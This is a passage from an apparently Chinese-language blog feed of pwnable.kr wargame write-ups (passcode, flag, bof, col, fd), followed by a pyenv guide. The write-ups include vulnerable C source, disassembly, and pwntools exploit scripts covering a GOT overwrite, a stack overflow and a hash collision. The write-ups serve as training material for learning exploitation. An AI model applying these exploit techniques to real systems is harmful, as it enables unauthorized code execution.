RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE              VALUE</span><br><span class="line">08049ff0 R_386_GLOB_DAT    __gmon_start__</span><br><span class="line">0804a02c R_386_COPY        stdin@@GLIBC_2.0</span><br><span class="line">0804a000 R_386_JUMP_SLOT   <span class="built_in">printf</span>@GLIBC_2.0</span><br><span class="line">0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0</span><br><span class="line">0804a008 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4</span><br><span class="line">0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0</span><br><span class="line">0804a010 R_386_JUMP_SLOT   system@GLIBC_2.0</span><br><span class="line">0804a014 R_386_JUMP_SLOT   __gmon_start__</span><br><span class="line">0804a018 R_386_JUMP_SLOT   <span class="built_in">exit</span>@GLIBC_2.0</span><br><span class="line">0804a01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a020 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7</span><br></pre></td></tr></table></figure><p>暂时先放着，可能后续会使用到。接下来查看passcode的反汇编代码，看看能否找到利用点。（由于代码太长，这里只展示关键部分）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">08048564 &lt;login&gt;:</span><br><span class="line"> 8048625:       e8 f6 fd ff ff          call   8048420 &lt;printf@plt&gt;</span><br><span class="line"> 804857c:       8b 55 f0                mov    -0x10(%ebp),%edx</span><br><span class="line"> 804857f:       89 54 24 04             mov    %edx,0x4(%esp)</span><br><span class="line"> 8048583:       89 04 24                mov    %eax,(%esp)</span><br><span class="line"> 8048586:       e8 15 ff ff ff          call   80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line"> 80485e3:       c7 04 24 af 87 04 08    movl   $0x80487af,(%esp)</span><br><span class="line"> 80485ea:       e8 71 fe ff ff          call   8048460 &lt;system@plt&gt;</span><br><span class="line"> </span><br><span class="line">08048609 &lt;welcome&gt;:</span><br><span class="line"> 804862f:       8d 55 90                lea    -0x70(%ebp),%edx</span><br><span class="line"> 8048632:       89 54 24 04             mov    %edx,0x4(%esp)</span><br><span class="line"> 8048636:       89 04 24                mov    %eax,(%esp)</span><br><span class="line"> 8048639:       e8 62 fe ff ff          call   80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line"> </span><br><span class="line">08048665 &lt;main&gt;:</span><br><span class="line"> 804867a:       e8 8a ff ff ff          call   8048609 &lt;welcome&gt;</span><br><span class="line"> 804867f:       e8 e0 fe ff ff          call   8048564 &lt;login&gt;</span><br></pre></td></tr></table></figure><p>首先从main开始，可以发现函数<code>welcome</code>和函数<code>login</code>是连续调用的，这说明这两个函数在执行的时候栈底（ebp）是相同的。然后来到welcome函数，可以发现name的起始位置是<code>-0x70(%ebp)</code>，而在login函数中，passcode1的起始位置是<code>-0x10(%ebp)</code>。这两个变量只相差了96个字节，而name可接受的字符串长度为100个字节，也就是说在输入name时最后4个字节可以覆盖掉passcode1的地址。</p><p>结合GOT表可写，我们现在的思路大致为：</p><ol><li>输入100个字符的name字符串，使得它最后4个字符覆盖passcode1的地址，让passcode1指向GOT表中某个函数的地址；</li><li>在scanf输入passcode1的时候将system地址写入，那么在调用对应被覆写函数时就会跳转到system函数调用。</li></ol><p>这边选取<code>printf</code>函数来覆写。</p><h2 id="脚本源码">脚本源码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">s = ssh(host=&#x27;pwnable.kr&#x27;, user=&#x27;passcode&#x27;, password=&#x27;guest&#x27;, port=2222)</span><br><span class="line">shellcode = b&#x27;a&#x27; * 0x60 + p32(0x0804a000)</span><br><span class="line">process = s.process([&#x27;./passcode&#x27;])</span><br><span class="line">process.sendline(shellcode)</span><br><span class="line">process.sendline(&quot;134514147&quot;)</span><br><span class="line">process.recvuntil(&#x27;passcode1 : &#x27;)</span><br><span class="line"></span><br><span class="line">flag = (process.recvline()).decode()</span><br><span class="line"></span><br><span class="line">print(&quot;Flag: &#123;&#125;&quot;.format(flag))</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;原题内容&quot;&gt;原题内容&lt;/h2&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l</summary>
      
    
    
    
    <category term="pwnable" scheme="https://ruom0.github.io/categories/pwnable/"/>
    
    
    <category term="pwnable" scheme="https://ruom0.github.io/tags/pwnable/"/>
    
    <category term="pwn" scheme="https://ruom0.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>flag</title>
    <link href="https://ruom0.github.io/2021/06/03/pwnable/Toddlers_Bottle/flag/"/>
    <id>https://ruom0.github.io/2021/06/03/pwnable/Toddlers_Bottle/flag/</id>
    <published>2021-06-03T12:30:19.589Z</published>
    <updated>2021-06-03T13:25:19.017Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原题内容">原题内容</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Papa brought me a packed present! let&#x27;s open it.</span><br><span class="line"></span><br><span class="line">Download : http://pwnable.kr/bin/flag</span><br><span class="line"></span><br><span class="line">This is reversing task. all you need is binary</span><br></pre></td></tr></table></figure><p>题目附件：<a href="/files/pwnable/toddlers_bottle/flag">点我下载</a></p><h2 id="题目分析">题目分析</h2><p>直接给了一个附件，那就是在文件里找flag或者想办法搞到flag了。</p><p>用ida-64打开flag，发现只有4个函数，Shift + F12找到关键词<code>//upx.sf.net $\n</code>，说明该文件使用upx加壳了，那就先脱壳。这边用UPXShell来进行脱壳。<a href="/files/tools/UPXShell.exe">点我下载UPXShell</a></p><p>脱壳后再打开，Shift + F12先搜索&quot;flag&quot;试试，直接搜到flag。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;原题内容&quot;&gt;原题内容&lt;/h2&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l</summary>
      
    
    
    
    <category term="pwnable" scheme="https://ruom0.github.io/categories/pwnable/"/>
    
    
    <category term="pwnable" scheme="https://ruom0.github.io/tags/pwnable/"/>
    
    <category term="pwn" scheme="https://ruom0.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>bof</title>
    <link href="https://ruom0.github.io/2021/06/03/pwnable/Toddlers_Bottle/bof/"/>
    <id>https://ruom0.github.io/2021/06/03/pwnable/Toddlers_Bottle/bof/</id>
    <published>2021-06-03T06:04:19.090Z</published>
    <updated>2021-06-03T12:30:13.409Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原题内容">原题内容</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nana told me that buffer overflow is one of the most common software vulnerability. </span><br><span class="line">Is that true?</span><br><span class="line"></span><br><span class="line">Download : http://pwnable.kr/bin/bof</span><br><span class="line">Download : http://pwnable.kr/bin/bof.c</span><br><span class="line"></span><br><span class="line">Running at : nc pwnable.kr 9000</span><br></pre></td></tr></table></figure><p>题目附件：<a href="/files/pwnable/toddlers_bottle/bof">点我下载</a></p><h2 id="程序源码">程序源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">gets(overflowme);<span class="comment">// smash me!</span></span><br><span class="line"><span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">func(<span class="number">0xdeadbeef</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目分析">题目分析</h2><p>很基础的一题栈溢出，ida打开查看栈空间如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-0000002C s               db 32 dup(?)</span><br><span class="line">-0000000C var_C           dd ?</span><br><span class="line">-00000008                 db ? ; undefined</span><br><span class="line">-00000007                 db ? ; undefined</span><br><span class="line">-00000006                 db ? ; undefined</span><br><span class="line">-00000005                 db ? ; undefined</span><br><span class="line">-00000004                 db ? ; undefined</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 arg_0           dd ?</span><br></pre></td></tr></table></figure><p>计算得到填充<code>0x2C + 0x8</code>个字符即可到达<code>arg_0</code>所在位置。</p><h2 id="脚本源码">脚本源码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">nc = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9000</span>)</span><br><span class="line">shellcode = <span class="string">b&#x27;a&#x27;</span> * <span class="number">52</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line">nc.sendline(shellcode)</span><br><span class="line">nc.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;原题内容&quot;&gt;原题内容&lt;/h2&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l</summary>
      
    
    
    
    <category term="pwnable" scheme="https://ruom0.github.io/categories/pwnable/"/>
    
    
    <category term="pwnable" scheme="https://ruom0.github.io/tags/pwnable/"/>
    
    <category term="pwn" scheme="https://ruom0.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>col</title>
    <link href="https://ruom0.github.io/2021/06/03/pwnable/Toddlers_Bottle/col/"/>
    <id>https://ruom0.github.io/2021/06/03/pwnable/Toddlers_Bottle/col/</id>
    <published>2021-06-03T05:40:50.657Z</published>
    <updated>2021-06-03T12:29:58.229Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原题内容">原题内容</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Daddy told me about cool MD5 hash collision today.</span><br><span class="line">I wanna do something like that too!</span><br><span class="line"></span><br><span class="line">ssh col@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目附件：<a href="/files/pwnable/toddlers_bottle/col">点我下载</a></p><h2 id="程序源码">程序源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">res += ip[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目分析">题目分析</h2><p>这道题会首先检查我们传入的内容是否为20个字符，如果是则传入到函数<code>check_password</code>中。</p><p>在字符串传入函数后会被强制转换为整数数组，因此是5个整数，函数接着把5个整数相加然后把和返回。</p><p>最后在main中判断这个结果和<code>hashcode</code>的值是否相等。</p><p>由于存在<code>\x00</code>截断，因此不能出现<code>\x00</code>，使用计算器计算一下得到可以构造的一种可能：<code>0x1DD905E8 + 0x01010101 * 4</code></p><h2 id="脚本源码">脚本源码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = ssh(host = <span class="string">&#x27;pwnable.kr&#x27;</span>, user = <span class="string">&#x27;col&#x27;</span>, password = <span class="string">&#x27;guest&#x27;</span>, port = <span class="number">2222</span>)</span><br><span class="line"></span><br><span class="line">shellcode = p32(<span class="number">0x1DD905E8</span>) + p32(<span class="number">0x01010101</span>) * <span class="number">4</span></span><br><span class="line">process = s.process([<span class="string">&#x27;./col&#x27;</span>, shellcode])</span><br><span class="line">flag = (process.recvline()).decode()</span><br><span class="line"></span><br><span class="line">process.close()</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag))</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;原题内容&quot;&gt;原题内容&lt;/h2&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l</summary>
      
    
    
    
    <category term="pwnable" scheme="https://ruom0.github.io/categories/pwnable/"/>
    
    
    <category term="pwnable" scheme="https://ruom0.github.io/tags/pwnable/"/>
    
    <category term="pwn" scheme="https://ruom0.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ruom0&#39;s daily</title>
    <link href="https://ruom0.github.io/2021/06/03/ruom0_daily/"/>
    <id>https://ruom0.github.io/2021/06/03/ruom0_daily/</id>
    <published>2021-06-03T05:32:45.978Z</published>
    <updated>2021-06-03T13:23:24.438Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2021年">2021年</h2><h3 id="2021-06-03">2021-06-03</h3><ul><li>记录了csapp的2.1的内容</li><li>pwnable.kr补了fd、collision、bof、flag、passcode的自动脚本和内容</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;2021年&quot;&gt;2021年&lt;/h2&gt;
&lt;h3 id=&quot;2021-06-03&quot;&gt;2021-06-03&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;记录了csapp的2.1的内容&lt;/li&gt;
&lt;li&gt;pwnable.kr补了fd、collision、bof、flag、passcode的自</summary>
      
    
    
    
    <category term="others" scheme="https://ruom0.github.io/categories/others/"/>
    
    
  </entry>
  
  <entry>
    <title>fd</title>
    <link href="https://ruom0.github.io/2021/06/03/pwnable/Toddlers_Bottle/fd/"/>
    <id>https://ruom0.github.io/2021/06/03/pwnable/Toddlers_Bottle/fd/</id>
    <published>2021-06-03T05:13:44.568Z</published>
    <updated>2021-06-03T12:29:59.842Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原题内容">原题内容</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Mommy! what is a file descriptor in Linux?</span><br><span class="line"></span><br><span class="line">* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:</span><br><span class="line">https://youtu.be/971eZhMHQQw</span><br><span class="line"></span><br><span class="line">ssh fd@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目附件：<a href="/files/pwnable/toddlers_bottle/fd">点我下载</a></p><h2 id="程序源码">程序源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目分析">题目分析</h2><p>很容易可以看出，如果传入的第一个参数值是<code>0x1234</code>的话我们就可以使得fd=0，这样的话read读入的stdin可以由我们自己输入。</p><h2 id="脚本源码">脚本源码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = ssh(host = <span class="string">&#x27;pwnable.kr&#x27;</span>, user = <span class="string">&#x27;fd&#x27;</span>, password = <span class="string">&#x27;guest&#x27;</span>, port = <span class="number">2222</span>)</span><br><span class="line"></span><br><span class="line">process = s.process([<span class="string">&#x27;./fd&#x27;</span>, <span class="string">&#x27;4660&#x27;</span>])</span><br><span class="line">process.sendline(<span class="string">&#x27;LETMEWIN&#x27;</span>)</span><br><span class="line">process.recvline()</span><br><span class="line">flag = (process.recvline()).decode()</span><br><span class="line"></span><br><span class="line">process.close()</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag))</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;原题内容&quot;&gt;原题内容&lt;/h2&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l</summary>
      
    
    
    
    <category term="pwnable" scheme="https://ruom0.github.io/categories/pwnable/"/>
    
    
    <category term="pwnable" scheme="https://ruom0.github.io/tags/pwnable/"/>
    
    <category term="pwn" scheme="https://ruom0.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>用Pyenv安装多版本Python</title>
    <link href="https://ruom0.github.io/2021/06/02/others/%E7%94%A8pyenv%E8%A3%85%E5%A4%9A%E7%89%88%E6%9C%ACPython/"/>
    <id>https://ruom0.github.io/2021/06/02/others/%E7%94%A8pyenv%E8%A3%85%E5%A4%9A%E7%89%88%E6%9C%ACPython/</id>
    <published>2021-06-02T06:50:36.106Z</published>
    <updated>2021-06-02T07:17:38.887Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Windows环境配置">Windows环境配置</h2><p>前提：本机已有Python以及pip</p><p>打开PowerShell，输入以下命令安装</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pyenv<span class="literal">-win</span> -<span class="literal">-target</span> <span class="variable">$HOME</span>\.pyenv</span><br></pre></td></tr></table></figure><p>安装完成后输入以下命令添加到环境变量</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">System.Environment</span>]::SetEnvironmentVariable(<span class="string">&#x27;PYENV&#x27;</span>,<span class="variable">$env:USERPROFILE</span> + <span class="string">&quot;\.pyenv\pyenv-win\&quot;</span>,<span class="string">&quot;User&quot;</span>)</span><br><span class="line">[<span class="type">System.Environment</span>]::SetEnvironmentVariable(<span class="string">&#x27;path&#x27;</span>, <span class="variable">$HOME</span> + <span class="string">&quot;\.pyenv\pyenv-win\bin;&quot;</span> + <span class="variable">$HOME</span> + <span class="string">&quot;\.pyenv\pyenv-win\shims;&quot;</span> + <span class="variable">$env:Path</span>,<span class="string">&quot;User&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="Pyenv常见使用方法">Pyenv常见使用方法</h2><ul><li><code>pyenv commands</code>：列出pyenv所有的命令</li><li><code>pyenv local [&lt;version&gt;]</code>：无version参数则显示当前使用的版本，有version参数则设置使用的版本。该命令只影响当前目录以及其子目录。</li><li><code>pyenv global [&lt;version&gt;]</code>：无version参数则显示当前使用的版本，有version参数则设置使用的版本。该命令影响全局。</li><li><code>pyenv shell [&lt;version&gt;]</code>：无version参数则显示当前使用的版本，有version参数则设置使用的版本。该命令只影响当前会话。</li><li><code>pyenv install &lt;version&gt;</code>：安装某个版本的Python。</li><li><code>pyenv install -l</code>：列出所有可安装的Python版本。</li><li><code>pyenv uninstall &lt;version&gt;</code>：卸载某个版本的Python。</li><li><code>pyenv version</code>：列出当前正在使用的Python版本以及其文件所在目录。</li><li><code>pyenv versions</code>：列出所有已安装的Python版本以及其文件所在目录。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Windows环境配置&quot;&gt;Windows环境配置&lt;/h2&gt;
&lt;p&gt;前提：本机已有Python以及pip&lt;/p&gt;
&lt;p&gt;打开PowerShell，输入以下命令安装&lt;/p&gt;
&lt;figure class=&quot;highlight powershell&quot;&gt;&lt;table&gt;&lt;tr</summary>
      
    
    
    
    <category term="others" scheme="https://ruom0.github.io/categories/others/"/>
    
    
    <category term="pyenv" scheme="https://ruom0.github.io/tags/pyenv/"/>
    
  </entry>
  
  <entry>
    <title>第2章 信息的表示和处理</title>
    <link href="https://ruom0.github.io/2021/06/01/csapp/%E7%AC%AC2%E7%AB%A0_%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/"/>
    <id>https://ruom0.github.io/2021/06/01/csapp/%E7%AC%AC2%E7%AB%A0_%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/</id>
    <published>2021-06-01T13:31:47.326Z</published>
    <updated>2021-06-03T03:15:11.761Z</updated>
    
